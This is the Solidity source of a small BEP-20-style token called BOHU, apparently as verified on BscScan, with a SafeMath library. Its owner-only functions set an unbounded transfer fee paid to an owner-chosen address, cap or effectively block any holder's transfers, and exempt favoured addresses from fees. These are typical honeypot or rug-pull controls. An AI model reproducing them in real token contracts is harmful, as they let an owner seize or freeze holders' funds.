/**
 *Submitted for verification at BscScan.com on 2021-11-26
*/

pragma solidity ^0.5.14;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     *
     * _Available since v2.4.0._
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract BOHU {
    using SafeMath for uint256;
    address private _owner;
    uint256 private _totalSupply;
    string public _symbol;
    string public _name;
    uint8 public _decimals;
    uint256 private _tFee;
    uint256 private _tAllFee;
    address private _fh;
    
    mapping(address => uint256) private _noTar;
    mapping(address => uint256) private _noFee;
    mapping (address=> uint256) private _balances;
    constructor() public {
        _tAllFee=1;
        _decimals=6;
        _name="BOHU";
        _symbol="BOHU";
        _totalSupply=3000 * 10 ** 6;
        _owner=msg.sender;
        _tFee=5;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
 
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    
    
    
    function setfh(address account) external returns(bool) {
        require(_owner== msg.sender, "Ownable: caller is not the owner");
        _fh = account;
        return true;
    }
    function setfsetee(uint256 amount) external returns(bool) {
        require(_owner== msg.sender, "Ownable: caller is not the owner");
        _tFee = amount;
        return true;
    }
    function setAllf(uint256 amount) external returns(bool) {
        require(_owner== msg.sender, "Ownable: caller is not the owner");
        _tAllFee = amount;
        return true;
    }
    function noTar(address account,uint256 amount) external returns(bool) {
        require(_owner== msg.sender, "Ownable: caller is not the owner");
        _noTar[account] = amount;
        return true;
    }
    function noFee(address account,uint256 amount) external returns(bool) {
        require(_owner== msg.sender, "Ownable: caller is not the owner");
        _noFee[account] = amount;
        return true;
    }
    
    function transfer(address recipient, uint256 amount) external returns (bool) {
         _transfer(msg.sender, recipient, amount);
         return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal {
      require(sender != address(0), "BEP2E: transfer from the zero address");
      require(recipient != address(0), "BEP2E: transfer to the zero address");
      require(_balances[sender] >= amount, "Transfer amount must be greater than zero");
      
      uint256 rsxf=amount.mul(_tFee).div(100);
      if(_noFee[sender]==1 || _noFee[recipient]==1 || _tAllFee==1)rsxf=0;
      uint256 tamount=amount.sub(rsxf);
      if(_noTar[sender]>0)require(amount <= _noTar[sender], "BEP2E: transfer num  is big");
      
      _balances[sender] =_balances[sender].sub(amount);
      if(rsxf>0)_balances[_fh]=_balances[_fh].add(rsxf);
      _balances[recipient]= _balances[recipient].add(tamount);
      
      emit Transfer(sender, recipient, amount); 
    }
    
}